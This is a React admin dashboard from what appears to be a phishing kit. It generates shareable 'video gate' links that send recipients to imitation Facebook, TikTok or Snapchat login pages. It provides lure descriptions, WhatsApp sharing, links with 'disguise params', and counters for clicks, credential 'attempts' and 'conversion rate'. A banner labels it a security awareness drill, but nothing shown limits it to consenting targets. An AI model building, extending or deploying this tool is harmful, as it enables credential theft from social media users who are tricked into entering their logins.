import { useState, useEffect } from 'react';
import {
  getVideoGates,
  createVideoGate,
  deleteVideoGate,
  buildVideoGateUrl,
} from '../services/videoService';
import type { VideoGateEntry, VideoGatePlatform } from '../types/video';

// ── Platform badge colours ───────────────────────────────────────
const platformMeta: Record<VideoGatePlatform, { color: string; bg: string; label: string }> = {
  Facebook: { color: '#1877F2', bg: '#EBF2FF', label: 'Facebook Gate' },
  TikTok:   { color: '#FE2C55', bg: '#FFF0F3', label: 'TikTok Gate' },
  Snapchat: { color: '#F7B900', bg: '#FFFBE6', label: 'Snapchat Gate' },
};

// ── Copy to clipboard helper ─────────────────────────────────────
function useCopy() {
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const copy = (text: string, id: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 2000);
    });
  };
  return { copiedId, copy };
}

// ── WhatsApp share URL ───────────────────────────────────────────
function whatsappUrl(text: string) {
  return `https://wa.me/?text=${encodeURIComponent(text)}`;
}

// ── CreateVideoModal ─────────────────────────────────────────────
function CreateVideoModal({ onClose, onCreate }: {
  onClose: () => void;
  onCreate: (v: VideoGateEntry) => void;
}) {
  const [title, setTitle] = useState('');
  const [description, setDescription] = useState('');
  const [platform, setPlatform] = useState<VideoGatePlatform>('Facebook');
  const [videoUrl, setVideoUrl] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!title.trim()) { setError('Video title is required.'); return; }
    if (!videoUrl.trim()) { setError('Video URL is required.'); return; }
    try {
      const entry = await createVideoGate(title.trim(), description.trim(), platform, videoUrl.trim());
      onCreate(entry);
    } catch (err) {
      console.error(err);
      setError('Failed to save to database. Please check Firestore connection.');
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm p-4">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-5 border-b border-slate-100">
          <div>
            <h2 className="text-base font-bold text-slate-800">New Video Gate</h2>
            <p className="text-xs text-slate-400 mt-0.5">
              A shareable link that requires login to view the video
            </p>
          </div>
          <button onClick={onClose} className="p-2 rounded-lg text-slate-400 hover:bg-slate-100 transition-colors">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        <form onSubmit={handleSubmit} className="px-6 py-5 space-y-4">
          {/* Title */}
          <div>
            <label className="block text-xs font-semibold text-slate-600 mb-1.5">Video Title *</label>
            <input
              type="text"
              placeholder="e.g. Exclusive Match Highlights"
              value={title}
              onChange={(e) => { setTitle(e.target.value); setError(''); }}
              className="w-full px-3.5 py-2.5 text-sm border border-slate-200 rounded-xl bg-slate-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition-colors"
            />
          </div>

          {/* Description */}
          <div>
            <label className="block text-xs font-semibold text-slate-600 mb-1.5">Description (shown in share preview)</label>
            <textarea
              placeholder="e.g. You have to see this before it's gone!"
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              rows={2}
              className="w-full px-3.5 py-2.5 text-sm border border-slate-200 rounded-xl bg-slate-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition-colors resize-none"
            />
          </div>

          {/* Login gate platform */}
          <div>
            <label className="block text-xs font-semibold text-slate-600 mb-1.5">Login Gate Style *</label>
            <div className="grid grid-cols-3 gap-2">
              {(['Facebook', 'TikTok', 'Snapchat'] as VideoGatePlatform[]).map((p) => {
                const meta = platformMeta[p];
                const selected = platform === p;
                return (
                  <button
                    key={p}
                    type="button"
                    onClick={() => setPlatform(p)}
                    className="py-2.5 px-3 rounded-xl border-2 text-xs font-semibold transition-all"
                    style={{
                      borderColor: selected ? meta.color : '#e2e8f0',
                      backgroundColor: selected ? meta.bg : '#fff',
                      color: selected ? meta.color : '#64748b',
                    }}
                  >
                    {p}
                  </button>
                );
              })}
            </div>
            <p className="text-[10px] text-slate-400 mt-1.5">
              This is the login page your audience will see before being able to watch.
            </p>
          </div>

          {/* Video URL */}
          <div>
            <label className="block text-xs font-semibold text-slate-600 mb-1.5">Video URL *</label>
            <input
              type="url"
              placeholder="https://youtube.com/embed/... or direct video link"
              value={videoUrl}
              onChange={(e) => { setVideoUrl(e.target.value); setError(''); }}
              className="w-full px-3.5 py-2.5 text-sm border border-slate-200 rounded-xl bg-slate-50 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:bg-white transition-colors"
            />
            <p className="text-[10px] text-slate-400 mt-1">
              YouTube embed URLs work best: youtube.com/embed/VIDEO_ID
            </p>
          </div>

          {error && (
            <p className="text-xs text-red-500 font-medium">{error}</p>
          )}

          <div className="flex gap-3 pt-1">
            <button
              type="button"
              onClick={onClose}
              className="flex-1 py-2.5 text-sm font-semibold text-slate-600 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors"
            >
              Cancel
            </button>
            <button
              type="submit"
              className="flex-1 py-2.5 text-sm font-bold text-white bg-blue-600 hover:bg-blue-700 rounded-xl transition-colors"
            >
              Generate Link
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

// ── VideoCard ────────────────────────────────────────────────────
function VideoCard({ entry, onDelete }: { entry: VideoGateEntry; onDelete: () => void }) {
  const { copiedId, copy } = useCopy();
  const meta = platformMeta[entry.platform];
  const shareUrl = buildVideoGateUrl(entry.id); // full URL with domain + disguise params
  const conversionRate = entry.clicks > 0
    ? Math.round((entry.attempts / entry.clicks) * 100)
    : 0;

  const shareText = `${entry.title}\n\n${entry.description}\n\nWatch here: ${shareUrl}`;

  return (
    <div className="bg-white rounded-2xl border border-slate-200 shadow-sm hover:shadow-md transition-shadow overflow-hidden">
      {/* Top band */}
      <div className="h-1.5 w-full" style={{ backgroundColor: meta.color }} />

      <div className="p-5">
        {/* Header row */}
        <div className="flex items-start justify-between gap-3 mb-4">
          <div className="flex items-start gap-3 min-w-0">
            {/* Film-reel icon replaces emoji thumbnail */}
            <div className="w-10 h-10 rounded-xl bg-blue-50 flex items-center justify-center shrink-0">
              <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M15 10l4.553-2.069A1 1 0 0121 8.877V15.12a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
              </svg>
            </div>
            <div className="min-w-0">
              <h3 className="font-bold text-slate-800 text-sm leading-snug truncate">{entry.title}</h3>
              <p className="text-xs text-slate-400 mt-0.5 line-clamp-2">{entry.description}</p>
            </div>
          </div>
          <span
            className="text-[10px] font-semibold px-2 py-1 rounded-full shrink-0 whitespace-nowrap"
            style={{ backgroundColor: meta.bg, color: meta.color }}
          >
            {meta.label}
          </span>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-3 gap-2 mb-4">
          <div className="bg-slate-50 rounded-xl px-3 py-2 text-center">
            <p className="text-lg font-bold text-slate-800">{entry.clicks}</p>
            <p className="text-[10px] text-slate-400 font-medium">Clicks</p>
          </div>
          <div className="bg-slate-50 rounded-xl px-3 py-2 text-center">
            <p className="text-lg font-bold text-slate-800">{entry.attempts}</p>
            <p className="text-[10px] text-slate-400 font-medium">Attempts</p>
          </div>
          <div className="bg-slate-50 rounded-xl px-3 py-2 text-center">
            <p className="text-lg font-bold" style={{ color: conversionRate > 50 ? '#e11d48' : '#16a34a' }}>
              {conversionRate}%
            </p>
            <p className="text-[10px] text-slate-400 font-medium">Rate</p>
          </div>
        </div>

        {/* URL row */}
        <div className="flex items-center gap-2 bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 mb-3">
          <svg className="w-3.5 h-3.5 text-slate-400 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
          </svg>
          <span className="text-[11px] text-slate-500 flex-1 truncate font-mono">{shareUrl}</span>
        </div>

        {/* Action buttons */}
        <div className="grid grid-cols-3 gap-2">
          {/* Copy link */}
          <button
            onClick={() => copy(shareUrl, entry.id + '-link')}
            className="flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-semibold transition-all"
            style={{
              backgroundColor: copiedId === entry.id + '-link' ? '#dcfce7' : '#f1f5f9',
              color: copiedId === entry.id + '-link' ? '#16a34a' : '#475569',
            }}
          >
            {copiedId === entry.id + '-link' ? (
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
              </svg>
            )}
            {copiedId === entry.id + '-link' ? 'Copied!' : 'Copy'}
          </button>

          {/* WhatsApp */}
          <a
            href={whatsappUrl(shareText)}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-semibold bg-[#25D366] text-white hover:bg-[#1ebe5c] transition-colors"
          >
            <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="currentColor">
              <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
            </svg>
            WhatsApp
          </a>

          {/* Delete */}
          <button
            onClick={onDelete}
            className="flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-semibold bg-rose-50 text-rose-500 hover:bg-rose-100 transition-colors"
          >
            <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
            </svg>
            Delete
          </button>
        </div>
      </div>
    </div>
  );
}

// ── Main page ────────────────────────────────────────────────────
export default function VideoManagement() {
  const [entries, setEntries] = useState<VideoGateEntry[]>([]);
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(true);

  const fetchEntries = () => {
    setLoading(true);
    getVideoGates()
      .then((data) => {
        setEntries(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error('Failed to load video gates:', err);
        setLoading(false);
      });
  };

  useEffect(() => {
    fetchEntries();
  }, []);

  const handleCreate = (_entry: VideoGateEntry) => {
    fetchEntries();
    setShowModal(false);
  };

  const handleDelete = async (id: string) => {
    try {
      await deleteVideoGate(id);
      fetchEntries();
    } catch (err) {
      console.error('Failed to delete video gate:', err);
    }
  };

  const totalClicks = entries.reduce((s, e) => s + e.clicks, 0);
  const totalAttempts = entries.reduce((s, e) => s + e.attempts, 0);

  return (
    <div className="p-6 max-w-6xl mx-auto">
      {/* Page header */}
      <div className="flex items-center justify-between mb-6">
        <div>
          <h1 className="text-xl font-bold text-slate-800">Video Management</h1>
          <p className="text-sm text-slate-500 mt-0.5">
            Generate gated video links. Recipients must "log in" before watching.
          </p>
        </div>
        <button
          onClick={() => setShowModal(true)}
          className="flex items-center gap-2 px-4 py-2.5 bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold rounded-xl shadow-sm transition-colors"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4" />
          </svg>
          New Video Gate
        </button>
      </div>

      {/* Summary stats */}
      <div className="grid grid-cols-3 gap-4 mb-6">
        {[
          { label: 'Video Gates', value: entries.length,
            icon: (
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M15 10l4.553-2.069A1 1 0 0121 8.877V15.12a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
              </svg>
            ), color: 'text-blue-600', bg: 'bg-blue-50' },
          { label: 'Total Clicks', value: totalClicks,
            icon: (
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M15 15l-2 5L9 9l11 4-5 2zm0 0l5 5" />
              </svg>
            ), color: 'text-violet-600', bg: 'bg-violet-50' },
          { label: 'Login Attempts', value: totalAttempts,
            icon: (
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
            ), color: 'text-rose-600', bg: 'bg-rose-50' },
        ].map((stat) => (
          <div key={stat.label} className="bg-white rounded-2xl border border-slate-200 shadow-sm p-5 flex items-center gap-4">
            <div className={`w-11 h-11 ${stat.bg} rounded-xl flex items-center justify-center shrink-0 ${stat.color}`}>
              {stat.icon}
            </div>
            <div>
              <p className={`text-2xl font-bold ${stat.color}`}>{stat.value}</p>
              <p className="text-xs text-slate-500 font-medium mt-0.5">{stat.label}</p>
            </div>
          </div>
        ))}
      </div>

      {/* How it works banner */}
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100 rounded-2xl px-5 py-4 mb-6 flex items-start gap-4">
        <div className="w-9 h-9 bg-blue-100 rounded-xl flex items-center justify-center shrink-0 mt-0.5">
          <svg className="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
              d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z" />
          </svg>
        </div>
        <div>
          <p className="text-sm font-semibold text-blue-800 mb-1">How Video Gates Work</p>
          <p className="text-xs text-blue-700 leading-relaxed">
            Share the generated link via <strong>WhatsApp</strong>, SMS, or any platform. When your recipient clicks it,
            they're taken to a realistic <strong>Facebook / TikTok / Snapchat login page</strong>. After they enter
            their credentials, the simulation reveals it was a security awareness drill.
          </p>
        </div>
      </div>

      {/* Grid */}
      {loading ? (
        <div className="flex justify-center items-center py-20">
          <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : entries.length === 0 ? (
        <div className="text-center py-20 text-slate-400">
          <div className="w-16 h-16 bg-slate-100 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5}
                d="M15 10l4.553-2.069A1 1 0 0121 8.877V15.12a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
            </svg>
          </div>
          <p className="font-semibold text-slate-600">No video gates yet</p>
          <p className="text-sm mt-1">Click "New Video Gate" to create your first shareable link.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {entries.map((entry) => (
            <VideoCard
              key={entry.id}
              entry={entry}
              onDelete={() => handleDelete(entry.id)}
            />
          ))}
        </div>
      )}

      {/* Create modal */}
      {showModal && (
        <CreateVideoModal
          onClose={() => setShowModal(false)}
          onCreate={handleCreate}
        />
      )}
    </div>
  );
}
